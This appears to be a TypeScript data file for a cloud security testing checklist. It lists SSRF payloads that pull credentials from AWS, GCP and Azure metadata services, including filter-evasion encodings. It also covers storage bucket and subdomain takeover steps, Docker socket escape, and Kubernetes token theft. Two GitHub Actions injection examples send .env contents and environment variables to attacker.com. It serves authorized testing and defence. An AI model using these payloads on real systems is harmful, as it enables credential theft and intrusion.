import type { ChecklistCategory } from "../types/checklist";

export const cloudCategories: ChecklistCategory[] = [
  {
    id: "cloud-metadata",
    name: "Cloud Metadata & SSRF Exploits",
    emoji: "🛰️",
    description: "Abusing Server-Side Request Forgery or misconfigured proxies to steal cloud IAM credentials.",
    reference: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
    items: [
      {
        id: "cloud-meta-aws-1",
        text: "AWS IMDSv1 Credential Theft via SSRF",
        how: "Send requests to 169.254.169.254 without token headers to extract AWS IAM security credentials assigned to the EC2 instance role.",
        payloads: [
          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/",
          "http://2852039166/latest/meta-data/iam/security-credentials/"
        ],
        payloadNotes: [
          "Standard AWS IMDSv1 query: fetches list of attached IAM roles; append the role name to get AccessKeyId, SecretAccessKey, and Token.",
          "IPv6 mapped IPv4 address: evades simple regex filters checking for string '169.254.169.254'.",
          "Dword (decimal) IP representation: 2852039166 translates directly to 169.254.169.254, bypassing basic URL string matching."
        ],
        expectedResponse: {
          vulnerable: "Server returns JSON with Code='Success', AccessKeyId (starting with ASIA...), SecretAccessKey, and Token.",
          safe: "Server returns 401/403 (IMDSv2 enforced with hop-limit 1) or connection times out / gets blocked by firewall/SSRF validator."
        },
        severity: "critical",
        tags: { tech: ["aws"] }
      },
      {
        id: "cloud-meta-aws-2",
        text: "AWS IMDSv2 Token Fetch & Header Injection",
        how: "When IMDSv2 is enforced, test if SSRF allows injecting headers or sending PUT requests to generate a session token.",
        payloads: [
          "curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"",
          "http://169.254.169.254/latest/api/token%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600"
        ],
        payloadNotes: [
          "IMDSv2 token creation: requires HTTP PUT and specific TTL header; the returned token is subsequently passed in X-aws-ec2-metadata-token.",
          "CRLF injection variant: attempts to inject the required header into backend requests if the SSRF endpoint allows newline injection."
        ],
        expectedResponse: {
          vulnerable: "Response body contains a base64 session token, which can then be supplied in X-aws-ec2-metadata-token to fetch credentials.",
          safe: "Request fails because PUT method is rejected, hop limit of 1 prevents reaching metadata from container/pod, or CRLF is filtered."
        },
        severity: "critical",
        tags: { tech: ["aws"] }
      },
      {
        id: "cloud-meta-gcp-1",
        text: "Google Cloud (GCP) Metadata & Service Account Token",
        how: "Target the GCP metadata endpoint to extract OAuth2 access tokens for the Compute Engine default service account.",
        payloads: [
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
          "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
          "curl -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        ],
        payloadNotes: [
          "Standard GCP service account endpoint: returns an OAuth 2.0 access token with instance scopes.",
          "Numeric IP alias: alternative hostname that points to the local hypervisor metadata server in GCP environments.",
          "Required header: GCP requires 'Metadata-Flavor: Google'; test if proxy/SSRF allows injecting or forwarding this header."
        ],
        expectedResponse: {
          vulnerable: "Returns JSON containing 'access_token', 'expires_in', and 'token_type: Bearer', allowing GCP API execution via gcloud/curl.",
          safe: "Response returns 403 Forbidden ('Metadata-Flavor: Google' header missing) or request is blocked by SSRF filter."
        },
        severity: "critical",
        tags: { tech: ["gcp"] }
      },
      {
        id: "cloud-meta-azure-1",
        text: "Azure Instance Metadata Service (IMDS) Managed Identity Token",
        how: "Query Azure IMDS endpoint to acquire an access token for Azure Resource Manager (ARM) or key vaults.",
        payloads: [
          "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
          "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        ],
        payloadNotes: [
          "Azure Managed Identity token endpoint: requires header 'Metadata: true' and api-version; returns JWT bearer token for Azure Management API.",
          "Instance metadata endpoint: returns VM details, subscription ID, resource group name, and network configuration."
        ],
        expectedResponse: {
          vulnerable: "Returns JSON with 'access_token' allowing full interaction with Azure subscription resources.",
          safe: "Returns 400 Bad Request ('Required metadata header not specified') or connection blocked."
        },
        severity: "critical",
        tags: { tech: ["azure"] }
      }
    ]
  },
  {
    id: "cloud-storage",
    name: "Cloud Storage Misconfigurations & Dangling Buckets",
    emoji: "🪣",
    description: "Identify publicly writable, readable, or claimable object storage buckets across cloud providers.",
    reference: "https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-s3-privilege-escalation",
    items: [
      {
        id: "cloud-s3-1",
        text: "S3 Bucket Public Listing & Arbitrary Upload",
        how: "Check discovered S3 bucket URLs for unauthenticated public listing or arbitrary write permissions using AWS CLI or curl.",
        payloads: [
          "aws s3 ls s3://target-bucket-name --no-sign-request",
          "curl -s https://target-bucket-name.s3.amazonaws.com/",
          "aws s3 cp test.txt s3://target-bucket-name/test.txt --no-sign-request"
        ],
        payloadNotes: [
          "Anonymous bucket listing: queries the S3 API without credentials; if AllUsers or AuthenticatedUsers has READ permission, file keys are listed.",
          "Direct HTTP listing: checks if the S3 XML response lists contents or says AccessDenied.",
          "Arbitrary upload probe: tests if public write permissions allow uploading arbitrary files or web shells."
        ],
        expectedResponse: {
          vulnerable: "Returns an XML ListBucketResult showing stored files, or successfully uploads test.txt with 200 OK.",
          safe: "Returns <Code>AccessDenied</Code> with HTTP 403 Forbidden."
        },
        severity: "high",
        tags: { tech: ["aws"] }
      },
      {
        id: "cloud-s3-2",
        text: "Dangling S3 Bucket Takeover (NoSuchBucket)",
        how: "Inspect DNS CNAME records and broken asset links pointing to S3 buckets that no longer exist, allowing attacker takeover.",
        payloads: [
          "curl -i https://assets.target.com",
          "aws s3 mb s3://target-abandoned-bucket --region us-east-1"
        ],
        payloadNotes: [
          "Inspect HTTP response: look for HTTP 404 with '<Code>NoSuchBucket</Code>' in the response body.",
          "Reclaim bucket: if the bucket name is unclaimed, create an S3 bucket with that exact name to serve malicious payloads from target domain."
        ],
        expectedResponse: {
          vulnerable: "Response returns '<Code>NoSuchBucket</Code>', meaning the CNAME is live but points to a deletable/claimable bucket name.",
          safe: "The domain returns valid content or resolves to an active, properly authenticated cloud resource."
        },
        severity: "high"
      },
      {
        id: "cloud-blob-1",
        text: "Azure Blob Storage & SAS Token Leakage",
        how: "Search client-side JavaScript, GitHub repos, and API responses for Azure Storage accounts with public container access or unexpired SAS tokens.",
        payloads: [
          "curl https://<account_name>.blob.core.windows.net/<container_name>?restype=container&comp=list",
          "https://<account_name>.blob.core.windows.net/<container>/secret.pdf?<sas_token>"
        ],
        payloadNotes: [
          "Container listing: tests if the container public access level is set to 'Container (anonymous read access for containers and blobs)'.",
          "SAS token inspection: parse the query string for 'se' (expiry time) and 'sp' (permissions like r, w, d, l) to determine scope."
        ],
        expectedResponse: {
          vulnerable: "Container returns XML enumeration of all blobs, or SAS token grants unexpired write/delete access across storage accounts.",
          safe: "Returns ResourceNotFound or PublicAccessNotPermitted (403 Forbidden)."
        },
        severity: "high",
        tags: { tech: ["azure"] }
      }
    ]
  },
  {
    id: "cloud-cicd",
    name: "CI/CD Pipeline & Supply Chain Security",
    emoji: "⚙️",
    description: "Exploit automation workflows, GitHub Actions, GitLab CI, and build runners to access production secrets.",
    reference: "https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
    items: [
      {
        id: "cloud-cicd-1",
        text: "GitHub Actions pull_request_target 'Pwn-Request' exploit",
        how: "Inspect repository workflow YAML files (`.github/workflows/*.yml`) for `on: pull_request_target` combined with an explicit checkout of the PR head ref.",
        payloads: [
          "- uses: actions/checkout@v4\n  with:\n    ref: ${{ github.event.pull_request.head.sha }}",
          "npm test # in package.json pretest: curl -d @.env https://attacker.com/leak"
        ],
        payloadNotes: [
          "Vulnerable checkout pattern: checkouts untrusted PR code in the context of the base repo, with full access to repository secrets.",
          "Malicious PR payload: a pull request adding a postinstall script in package.json will run inside the runner with secrets loaded."
        ],
        expectedResponse: {
          vulnerable: "The workflow triggers automatically on external PR and executes PR code with repository secrets loaded in runner environment.",
          safe: "Workflow uses standard `pull_request` (which runs without access to repository secrets) or does not checkout untrusted code."
        },
        severity: "critical",
        tags: { tech: ["github-actions"] }
      },
      {
        id: "cloud-cicd-2",
        text: "Expression injection in GitHub Actions workflows",
        how: "Look for workflows interpolating untrusted variables directly into inline `run:` bash steps instead of environment variables.",
        payloads: [
          "Issue Title: \"; curl https://attacker.com/leak?t=$(env | base64) #",
          "run: echo \"Processing issue title: ${{ github.event.issue.title }}\""
        ],
        payloadNotes: [
          "Attacker-controlled issue title: injects quotes and semicolon into the bash command before it is sent to the runner shell.",
          "Vulnerable script line: direct ${{ ... }} interpolation in `run:` allows full command injection on the runner VM."
        ],
        expectedResponse: {
          vulnerable: "The runner executes attacker-supplied shell commands, dumping environment variables and secret tokens.",
          safe: "The workflow passes parameters safely using environment variables: `env: TITLE: ${{ github.event.issue.title }}`."
        },
        severity: "high",
        tags: { tech: ["github-actions"] }
      },
      {
        id: "cloud-cicd-3",
        text: "Build logs credential exposure & artifact leaks",
        how: "Review public or low-privilege CI/CD job execution logs and downloadable build artifacts for accidentally printed API keys or credentials.",
        payloads: [
          "Search keywords in logs: 'ghp_', 'AWS_SECRET', 'BEGIN PRIVATE KEY', 'Bearer', 'password', 'npm_token'",
          "curl -s https://api.github.com/repos/:owner/:repo/actions/artifacts"
        ],
        payloadNotes: [
          "Log scraping: search failed build logs, debugging verbose output, and npm/docker build logs for unmasked tokens.",
          "Artifact analysis: download compiled zip files or test reports to look for embedded `.env` files or staging credentials."
        ],
        expectedResponse: {
          vulnerable: "Build logs or artifacts contain active secrets, private keys, or API tokens allowing lateral movement.",
          safe: "CI runner masks all secrets with `***` and build artifacts exclude sensitive configuration files."
        },
        severity: "medium"
      }
    ]
  },
  {
    id: "cloud-k8s",
    name: "Container & Kubernetes Security",
    emoji: "☸️",
    description: "Privilege escalation and escape techniques in Docker containers and Kubernetes clusters.",
    reference: "https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security",
    items: [
      {
        id: "cloud-k8s-1",
        text: "Docker daemon socket mount container escape",
        how: "When possessing remote code execution inside a container, check if `/var/run/docker.sock` is mounted inside the container.",
        payloads: [
          "ls -l /var/run/docker.sock",
          "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host"
        ],
        payloadNotes: [
          "Check socket existence: if mounted with write permissions, the container has root-equivalent control over the host Docker daemon.",
          "Host root escape: launches a new container that mounts the host's root filesystem (/) and chroots into it, granting full host takeover."
        ],
        expectedResponse: {
          vulnerable: "The socket exists and allows executing Docker commands to spawn privileged containers with host root filesystem mounted.",
          safe: "Docker socket is not mounted into application containers, or is protected by rootless Docker / strict authorization plugin."
        },
        severity: "critical",
        tags: { tech: ["docker", "kubernetes"] }
      },
      {
        id: "cloud-k8s-2",
        text: "Kubernetes ServiceAccount token theft & API enumeration",
        how: "In a compromised pod, extract the default mounted ServiceAccount JWT token and query the internal Kubernetes API server.",
        payloads: [
          "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
          "curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/default/pods",
          "kubectl auth can-i --list --token=$TOKEN"
        ],
        payloadNotes: [
          "Token location: Kubernetes automatically mounts the pod's service account token at this fixed filesystem path.",
          "API query: queries the cluster API server to enumerate pods, secrets, and services accessible to this service account.",
          "RBAC permission probe: checks all privileges granted to the service account (e.g., ability to create pods, exec, or read secrets)."
        ],
        expectedResponse: {
          vulnerable: "The ServiceAccount has excessive RBAC privileges (e.g., can list secrets, create pods, or exec into other pods).",
          safe: "automountServiceAccountToken is set to false, or the default service account has zero RBAC permissions on the API server."
        },
        severity: "high",
        tags: { tech: ["kubernetes"] }
      }
    ]
  },
  {
    id: "cloud-dangling",
    name: "Modern SaaS & CDN Dangling CNAME Takeovers",
    emoji: "🎯",
    description: "Detect abandoned subdomains pointing to cloud services that can be claimed by an external party.",
    reference: "https://github.com/EdOverflow/can-i-take-over-xyz",
    items: [
      {
        id: "cloud-takeover-1",
        text: "Modern platform takeover (Vercel, Netlify, Render, Cloudflare)",
        how: "Resolve subdomains and inspect HTTP response headers/bodies for signature error messages from unclaimed SaaS platforms.",
        payloads: [
          "Vercel: CNAME cname.vercel-dns.com -> '404: NOT_FOUND' / 'The deployment could not be found on Vercel.'",
          "Netlify: CNAME *.netlify.app -> 'Not Found - Request ID:' / 'Netlify 404'",
          "Render: CNAME *.onrender.com -> 'Not Found' (Render default placeholder)",
          "Cloudflare Pages: CNAME *.pages.dev -> 'Pages Not Found'"
        ],
        payloadNotes: [
          "Inspect DNS CNAME: verify the DNS record points to a third-party hosting service.",
          "Check HTTP response: an unclaimed project returns a recognizable provider error code.",
          "Claim project: create a free account on the service and add the target subdomain as a custom domain."
        ],
        expectedResponse: {
          vulnerable: "The third-party service allows adding and verifying the custom domain without domain ownership verification TXT records.",
          safe: "The service requires DNS TXT verification before routing traffic to an account, or the dangling DNS record is removed."
        },
        severity: "high"
      }
    ]
  }
];
